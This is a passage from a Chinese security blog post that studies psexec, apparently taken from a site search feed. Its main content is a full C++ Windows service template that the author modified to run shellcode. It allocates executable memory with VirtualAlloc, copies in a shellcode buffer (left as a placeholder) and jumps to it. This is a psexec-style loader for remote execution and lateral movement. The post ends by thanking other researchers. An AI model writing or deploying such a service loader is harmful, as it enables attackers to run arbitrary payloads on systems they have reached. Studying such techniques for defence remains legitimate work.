href="http://www.haoservice.cn/2019/11/27/Applied13%E8%AE%A4%E8%AF%86windows%E6%9C%8D%E5%8A%A1%E5%B9%B6%E4%BD%BF%E7%94%A8VC++%E5%88%9B%E5%BB%BAwindows%E6%9C%8D%E5%8A%A1%E7%A8%8B%E5%BA%8F/">http://www.haoservice.cn/2019/11/27/Applied13%E8%AE%A4%E8%AF%86windows%E6%9C%8D%E5%8A%A1%E5%B9%B6%E4%BD%BF%E7%94%A8VC++%E5%88%9B%E5%BB%BAwindows%E6%9C%8D%E5%8A%A1%E7%A8%8B%E5%BA%8F/</a></p><p><a href="https://www.codeproject.com/Articles/499465/Simple-Windows-Service-in-Cplusplus">https://www.codeproject.com/Articles/499465/Simple-Windows-Service-in-Cplusplus</a><br>模板代码执行:</p><p><img src="/img/psexec/23.png"></p><p>在模板上面加一点执行shellcode的代码:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> buf[] = shellcode<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SLEEP_TIME 5000                          <span class="hljs-comment">/*间隔时间*/</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> LOGFILE <span class="hljs-meta-string">&quot;C:\\Windows\\log.txt&quot;</span>              <span class="hljs-comment">/*信息输出文件*/</span></span><br><br>SERVICE_STATUS ServiceStatus;  <span class="hljs-comment">/*服务状态*/</span><br>SERVICE_STATUS_HANDLE hStatus; <span class="hljs-comment">/*服务状态句柄*/</span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span>  <span class="hljs-title">ServiceMain</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>** argv)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span>  <span class="hljs-title">CtrlHandler</span><span class="hljs-params">(DWORD request)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span>   <span class="hljs-title">InitService</span><span class="hljs-params">()</span></span>;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, CHAR* argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    WCHAR WserviceName[] = <span class="hljs-built_in">TEXT</span>(<span class="hljs-string">&quot;sdd&quot;</span>);<br>    SERVICE_TABLE_ENTRY ServiceTable[<span class="hljs-number">2</span>];<br>    ServiceTable[<span class="hljs-number">0</span>].lpServiceName = WserviceName;<br>    ServiceTable[<span class="hljs-number">0</span>].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;<br>    ServiceTable[<span class="hljs-number">1</span>].lpServiceName = <span class="hljs-literal">NULL</span>;<br>    ServiceTable[<span class="hljs-number">1</span>].lpServiceProc = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-built_in">StartServiceCtrlDispatcher</span>(ServiceTable);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">WriteToLog</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* str)</span></span><br><span class="hljs-function"></span>&#123;<br>    FILE* pfile;<br>    <span class="hljs-built_in">fopen_s</span>(&amp;pfile, LOGFILE, <span class="hljs-string">&quot;a+&quot;</span>);<br>    <span class="hljs-keyword">if</span> (pfile == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-built_in">fprintf_s</span>(pfile, <span class="hljs-string">&quot;%s\n&quot;</span>, str);<br>    <span class="hljs-built_in">fclose</span>(pfile);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">/*Service initialization*/</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">InitService</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    CHAR Message[] = <span class="hljs-string">&quot;Monitoring started.&quot;</span>;<br>    <span class="hljs-built_in">OutputDebugString</span>(<span class="hljs-built_in">TEXT</span>(<span class="hljs-string">&quot;Monitoring started.&quot;</span>));<br>    <span class="hljs-keyword">int</span> result;<br>    result = <span class="hljs-built_in">WriteToLog</span>(Message);<br><br>    <span class="hljs-keyword">return</span>(result);<br>&#125;<br><br><span class="hljs-comment">/*Control Handler*/</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">CtrlHandler</span><span class="hljs-params">(DWORD request)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in"><span class="hljs-keyword">switch</span></span> (request)<br>    &#123;<br>    <span class="hljs-keyword">case</span> SERVICE_CONTROL_STOP:<br><br>        <span class="hljs-built_in">WriteToLog</span>(<span class="hljs-string">&quot;Monitoring stopped.&quot;</span>);<br>        ServiceStatus.dwWin32ExitCode = <span class="hljs-number">0</span>;<br>        ServiceStatus.dwCurrentState = SERVICE_STOPPED;<br>        <span class="hljs-built_in">SetServiceStatus</span>(hStatus, &amp;ServiceStatus);<br>        <span class="hljs-keyword">return</span>;<br>    <span class="hljs-keyword">case</span> SERVICE_CONTROL_SHUTDOWN:<br>        <span class="hljs-built_in">WriteToLog</span>(<span class="hljs-string">&quot;Monitoring stopped.&quot;</span>);<br><br>        ServiceStatus.dwWin32ExitCode = <span class="hljs-number">0</span>;<br>        ServiceStatus.dwCurrentState = SERVICE_STOPPED;<br>        <span class="hljs-built_in">SetServiceStatus</span>(hStatus, &amp;ServiceStatus);<br>        <span class="hljs-keyword">return</span>;<br>    <span class="hljs-keyword">default</span>:<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-comment">/* Report current status  */</span><br>    <span class="hljs-built_in">SetServiceStatus</span>(hStatus, &amp;ServiceStatus);<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">ServiceMain</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>** argv)</span></span><br><span class="hljs-function"></span>&#123;<br>    WCHAR WserviceName[] = <span class="hljs-built_in">TEXT</span>(<span class="hljs-string">&quot;sdd&quot;</span>);<br>    <span class="hljs-keyword">int</span> error;<br>    ServiceStatus.dwServiceType =<br>        SERVICE_WIN32;<br>    ServiceStatus.dwCurrentState =<br>        SERVICE_START_PENDING;<br>    <span class="hljs-comment">/*在本例中只接受系统关机和停止服务两种控制命令*/</span><br>    ServiceStatus.dwControlsAccepted =<br>        SERVICE_ACCEPT_SHUTDOWN |<br>        SERVICE_ACCEPT_STOP;<br>    ServiceStatus.dwWin32ExitCode = <span class="hljs-number">0</span>;<br>    ServiceStatus.dwServiceSpecificExitCode = <span class="hljs-number">0</span>;<br>    ServiceStatus.dwCheckPoint = <span class="hljs-number">0</span>;<br>    ServiceStatus.dwWaitHint = <span class="hljs-number">0</span>;<br>    hStatus = ::<span class="hljs-built_in">RegisterServiceCtrlHandler</span>(<br>        WserviceName,<br>        (LPHANDLER_FUNCTION)CtrlHandler);<br>    <span class="hljs-keyword">if</span> (hStatus == (SERVICE_STATUS_HANDLE)<span class="hljs-number">0</span>)<br>    &#123;<br><br>        <span class="hljs-built_in">WriteToLog</span>(<span class="hljs-string">&quot;RegisterServiceCtrlHandler failed&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-built_in">WriteToLog</span>(<span class="hljs-string">&quot;RegisterServiceCtrlHandler success&quot;</span>);<br>    <span class="hljs-comment">/* Initialize Service   */</span><br>    error = <span class="hljs-built_in">InitService</span>();<br>    <span class="hljs-keyword">if</span> (error)<br>    &#123;<br>        <span class="hljs-comment">/* Initialization failed  */</span><br>        ServiceStatus.dwCurrentState =<br>            SERVICE_STOPPED;<br>        ServiceStatus.dwWin32ExitCode = <span class="hljs-number">-1</span>;<br>        <span class="hljs-built_in">SetServiceStatus</span>(hStatus, &amp;ServiceStatus);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    LPVOID Memory = <span class="hljs-built_in">VirtualAlloc</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);<br>    <span class="hljs-built_in">memcpy</span>(Memory, buf, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(buf));<br>    ((<span class="hljs-built_in"><span class="hljs-keyword">void</span></span>(*)())Memory)();<br><br>    <span class="hljs-comment">/*向SCM 报告运行状态*/</span><br>    ServiceStatus.dwCurrentState =<br>        SERVICE_RUNNING;<br>    <span class="hljs-built_in">SetServiceStatus</span>(hStatus, &amp;ServiceStatus);<br><br>    <span class="hljs-comment">/*do something you want to do in this while loop*/</span><br>    MEMORYSTATUS memstatus;<br>    <span class="hljs-keyword">while</span> (ServiceStatus.dwCurrentState ==<br>        SERVICE_RUNNING)<br>    &#123;<br>        <span class="hljs-keyword">char</span> buffer[<span class="hljs-number">16</span>];<br>        <span class="hljs-built_in">GlobalMemoryStatus</span>(&amp;memstatus);<br>        <span class="hljs-keyword">int</span> availmb = memstatus.dwAvailPhys / <span class="hljs-number">1024</span> / <span class="hljs-number">1024</span>;<br>        <span class="hljs-built_in">sprintf_s</span>(buffer, <span class="hljs-number">100</span>, <span class="hljs-string">&quot;available memory is %dMB&quot;</span>, availmb);<br>        <span class="hljs-keyword">int</span> result = <span class="hljs-built_in">WriteToLog</span>(buffer);<br>        <span class="hljs-keyword">if</span> (result)<br>        &#123;<br>            ServiceStatus.dwCurrentState = SERVICE_STOPPED;<br>            ServiceStatus.dwWin32ExitCode = <span class="hljs-number">-1</span>;<br>            <span class="hljs-built_in">SetServiceStatus</span>(hStatus,<br>                &amp;ServiceStatus);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-built_in">Sleep</span>(SLEEP_TIME);<br>    &#125;<br>    <span class="hljs-built_in">WriteToLog</span>(<span class="hljs-string">&quot;service stopped&quot;</span>);<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/psexec/24.png"></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>本次研究psexec到这就基本结束了,我自己是没有能力研究出来的,参考了很多大佬的文章,尤其是倾旋大佬,再次感谢！</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
